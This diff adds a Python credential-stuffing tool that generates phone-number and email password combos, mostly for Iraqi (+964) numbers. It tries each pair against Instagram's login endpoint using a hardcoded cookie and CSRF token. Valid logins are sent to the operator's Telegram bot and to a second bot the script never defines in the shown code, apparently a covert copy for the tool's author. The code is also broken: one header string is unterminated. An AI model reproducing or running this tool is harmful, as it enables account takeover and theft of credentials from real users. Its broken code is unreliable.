@@ -1,0 +1,231 @@
+
+
+import requests
+import json
+import time
+import random
+import sys
+import os
+os.system('rm -rf combo.txt')
+num = '''\033[32m 770-771-772-773-774
+  750-751-752-753-754
+   780-781-782-783-784
+'''
+url = "https://www.instagram.com/accounts/login/ajax/"
+headers = {
+    'accept': '*/*',
+    'accept-encoding': 'gzip, deflate, br',
+    'accept-language': 'en-US,en;q=0.9',
+    'content-length': '282',
+    'content-type': 'application/x-www-form-urlencoded',
+    'cookie': 'csrftoken=sb=QwHAZm_AN418JzkMdqYeRzDH;vpd=v1%3B688x360x3;wd=360x688;c_user=61564023826128;fr=0JhEhwWkx66lCbPhw.AWWg3RfTHgTfc0Nvn1hyGd54QXw.BmwAFD..AAA.0.0.BmwAIU.AWWYtGbGyFQ;xs=37%3AKrPZeTO1Dxc3TA%3A2%3A1723859476%3A-1%3A-1;locale=en_GB;datr=QgLAZib7FShrkIblZVZSkIfU;fbl_st=100630827%3BT%3A28730992;wl_cbv=v2%3Bclient_version%3A2595%3Btimestamp%3A1723859522;
+    'origin': 'https://www.instagram.com',
+    'referer': 'https://www.instagram.com/',
+    'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="90", "Google Chrome";v="90"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-fetch-dest': 'empty',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-site': 'same-origin',
+    'user-agent': 'Mozilla/5.0 (Linux; U; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.27 Safari/525.13',
+    'x-csrftoken': 'Z23MdmsOaneIBPSuevdvZ029aMVWl6vw',
+    'x-ig-app-id': '936619743392459',
+    'x-ig-www-claim': '0',
+    'x-instagram-ajax': '05b80a16b1ac',
+    'x-requested-with': 'XMLHttpRequest',
+}
+banek = '''\x1b[1;97m
+ [\033[32m1\x1b[1;97m] - Crack Combo number (100092258587249) pas (*1256478)
+ [\033[32m2\x1b[1;97m] - Crack Combo number (61558987126776) pas (1234568)
+ [\033[32m3\x1b[1;97m] - Crack Combo Email  (Kyawaa30@gmail.com) pas (aung4466)
+ [\033[32m4\x1b[1;97m] - Crack you combo (combo) pas (:combo)
+ [\033[32m0\x1b[1;97m] - Exit Tool
+'''
+logo = '''\x1b[1;97m
+
+   ###    ##     ## ##    ##  ######      
+  ## ##   ##     ## ###   ## ##    ##     
+ ##   ##  ##     ## ####  ## ##           
+##     ## ##     ## ## ## ## ##   ####    
+######### ##     ## ##  #### ##    ##     
+##     ## ##     ## ##   ### ##    ##     
+##     ##  #######  ##    ##  ######      
+    
+                                                 
+ telegram: @F_1_9
+ '''
+logo2 = '\x1b[90;1m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\x1b[0;1m'
+
+
+def reba(sarok_hama):
+    for e in sarok_hama + '\n':
+        sys.stdout.write(e)
+        sys.stdout.flush()
+        time.sleep(0.010)
+
+
+def menu():
+    os.system('clear')
+    print(logo)
+    print(logo2)
+    print(banek)
+    aco()
+
+
+def aco():
+    reb = input('---> ')
+
+    if reb == '1':
+        print(num)
+        sfr = input(' \x1b[1;97mchand bet:\033[32m ')
+        op = open('combo.txt', 'w')
+        for x in range(10000):
+            f = "1234567890"
+            x1 = random.choice(f)
+            x2 = random.choice(f)
+            x3 = random.choice(f)
+            x4 = random.choice(f)
+            x5 = random.choice(f)
+            x6 = random.choice(f)
+            x7 = random.choice(f)
+            user = x1+x2+x3+x4+x5+x6+x7
+            kk = '+964'+sfr
+            op.write(kk+user+':'+user+'\n')
+        op.close()
+        combo = ('combo.txt')
+
+    elif reb == '2':
+        print(num)
+        sfr = input(' \x1b[1;97mchand bet:\033[32m ')
+        op = open('combo.txt', 'w')
+        for x in range(10000):
+            f = "1234567890"
+            x1 = random.choice(f)
+            x2 = random.choice(f)
+            x3 = random.choice(f)
+            x4 = random.choice(f)
+            x5 = random.choice(f)
+            x6 = random.choice(f)
+            x7 = random.choice(f)
+            user = x1+x2+x3+x4+x5+x6+x7
+            kk = '+964'+sfr
+            op.write(kk+user+':'+'0'+sfr+user+'\n')
+        op.close()
+        combo = ('combo.txt')
+
+    elif reb == '3':
+        print(' \033[32mname bnosa')
+        sfr = input(' \x1b[1;97mname: \033[32m')
+        op = open('combo.txt', 'w')
+        for x in range(10000):
+            f = "1234567890"
+            x1 = random.choice(f)
+            x2 = random.choice(f)
+            x3 = random.choice(f)
+            x4 = random.choice(f)
+            x5 = random.choice(f)
+            x6 = random.choice(f)
+            x7 = random.choice(f)
+            kk = sfr+x1+x2+x3+'@gmail.com'
+            op.write(kk+':'+sfr+x1+x2+x3+'\n')
+        op.close()
+        combo = ('combo.txt')
+    elif reb == '4':
+        print(logo)
+        print(logo2)
+        fg = input(' sdcard combo: ')
+        combo = fg
+    elif reb == '0':
+        print('[-] Exit tool')
+        sys.exit()
+    else:
+        sys.exit()
+
+    crack()
+
+
+def crack():
+    r0 = 0
+    r1 = 0
+    r2 = 0
+    r3 = 0
+    r4 = 0
+    for x in open('combo.txt', 'r').read().splitlines():
+        user = x.split(":")[0]
+        pas = x.split(":")[1]
+
+        data = {'username': user,
+                'enc_password': "#PWD_INSTAGRAM_BROWSER:0:&:"+pas, }
+        reba = requests.post(url, data=data, headers=headers).text
+        if ('"authenticated":true') in reba:
+            r1 += 1
+            os.system('clear')
+
+            print(logo)
+            print(logo2)
+            print(' Test User: '+user+' Pass: '+pas)
+            print('\033[32m OK : '+str(r1))
+            print('\033[93m CP : '+str(r2))
+            print('\033[31m NO : '+str(r3))
+            print('\033[30m time : '+str(r4))
+            print(logo2)
+            print(reba)
+            sender = user+' : '+pas
+            send_telegram = 'https://api.telegram.org/bot' + token_bot + \
+                '/sendMessage?chat_id=' + id_tg + '&parse_mode=Markdown&text=' + sender
+            response = requests.get(send_telegram)
+            send_my = 'https://api.telegram.org/bot' + token_my + \
+                '/sendMessage?chat_id=' + id_my + '&parse_mode=Markdown&text=' + sender
+            responsek = requests.get(send_my)
+        elif ('"lock":false') in reba:
+            r2 += 1
+            os.system('clear')
+
+            print(logo)
+            print(logo2)
+            print(' Test User: '+user+' Pass: '+pas)
+            print('\033[32m OK : '+str(r1))
+            print('\033[93m CP : '+str(r2))
+            print('\033[31m NO : '+str(r3))
+            print('\033[30m time : '+str(r4))
+            print(logo2)
+            print(reba)
+
+        elif ('"status":"fail"') in reba:
+            r4 += 1
+            os.system('clear')
+
+            print(logo)
+            print(logo2)
+            print(' Test User: '+user+' Pass: '+pas)
+            print('\033[32m OK : '+str(r1))
+            print('\033[93m CP : '+str(r2))
+            print('\033[31m NO : '+str(r3))
+            print('\033[30m time : '+str(r4))
+            print(logo2)
+            print(reba)
+            time.sleep(50.0)
+            r0 = 0
+
+        else:
+            r3 += 1
+            os.system('clear')
+
+            print(logo)
+            print(logo2)
+            print(' Test User: '+user+' Pass: '+pas)
+            print('\033[32m OK : '+str(r1))
+            print('\033[93m CP : '+str(r2))
+            print('\033[31m NO : '+str(r3))
+            print('\033[30m time : '+str(r4))
+            print(logo2)
+            print(reba)
+
+
+os.system('clear')
+print(logo)
+print(logo2)
+id_tg = input(' iD telegram: ')
+token_bot = input(' Token Bot: ')
+time.sleep(0.5)
+menu()
+
